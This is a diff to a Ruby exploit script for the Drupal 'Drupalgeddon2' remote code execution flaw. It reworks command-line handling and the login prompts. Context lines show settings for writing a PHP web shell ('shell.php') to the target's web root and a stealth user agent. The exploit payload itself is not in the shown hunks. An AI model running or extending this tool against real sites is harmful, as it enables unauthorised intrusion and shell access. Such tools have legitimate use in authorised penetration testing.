@@ -8,11 +8,12 @@
 #
 
 
-require "base64"
-require "json"
-require "net/http"
-require "openssl"
-require "readline"
+require 'base64'
+require 'json'
+require 'net/http'
+require 'openssl'
+require 'readline'
+require 'highline/import'
 
 
 # Settings - Try to write a PHP to the web root?
@@ -20,10 +21,6 @@ try_phpshell = true
 # Settings - General/Stealth
 $useragent = "drupalgeddon2"
 webshell = "shell.php"
-# Settings - Output
-$verbose = false
-
-
 # Settings - Proxy information (nil to disable)
 $proxy_addr = nil
 $proxy_port = 8080
@@ -175,29 +172,7 @@ end
 
 # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
-
-# Quick how to use
-if ARGV.empty? or ARGV.length < 2
-  puts 'Usage: ruby drupalggedon2.rb <target> <authentication?yes|no> [--verbose]'
-  puts 'Example for target that does not require authentication:'
-  puts '       ruby drupalgeddon2.rb https://example.com no'
-  puts 'Example for target that does require authentication:'
-  puts '       ruby drupalgeddon2.rb https://example.com yes'
-  exit
-end
-
-require 'highline/import'
-
-$verbose = false
-if ARGV.length == 3 and ARGV[2] == '--verbose'
-  # Settings - Output
-  $verbose = true
-end
-
-# Read in values
-$target = ARGV[0]
-
-if ARGV[1] == 'yes'
+def init_authentication()
   $uname = ask('Enter your username:  ') { |q| q.echo = false }
   $passwd = ask('Enter your password:  ') { |q| q.echo = false }
   $uname_field = ask('Enter the name of the username form field:  ') { |q| q.echo = true }
@@ -205,6 +180,36 @@ if ARGV[1] == 'yes'
   $login_path = ask('Enter your login path (e.g., user/login):  ') { |q| q.echo = true }
   $creds_suffix = ask('Enter the suffix eventually required after the credentials in the login HTTP POST request (e.g., &form_id=...):  ') { |q| q.echo = true }
 end
+
+def is_arg(args, param)
+  args.each do |arg|
+    if arg == param
+      return true
+    end
+  end
+  return false
+end
+
+
+# Quick how to use
+def usage()
+  puts 'Usage: ruby drupalggedon2.rb <target> [--authentication] [--verbose]'
+  puts 'Example for target that does not require authentication:'
+  puts '       ruby drupalgeddon2.rb https://example.com'
+  puts 'Example for target that does require authentication:'
+  puts '       ruby drupalgeddon2.rb https://example.com --authentication'
+end
+
+
+# Read in values
+if ARGV.empty?
+  usage()
+  exit
+end
+
+$target = ARGV[0]
+init_authentication() if is_arg(ARGV, '--authentication')
+$verbose = is_arg(ARGV, '--verbose')
 
 
 # Check input for protocol
@@ -231,7 +236,6 @@ puts "-"*80
 # Setup connection
 uri = URI($target)
 $http = Net::HTTP.new(uri.host, uri.port, $proxy_addr, $proxy_port)
-
 
 # Use SSL/TLS if needed
 if uri.scheme == "https"
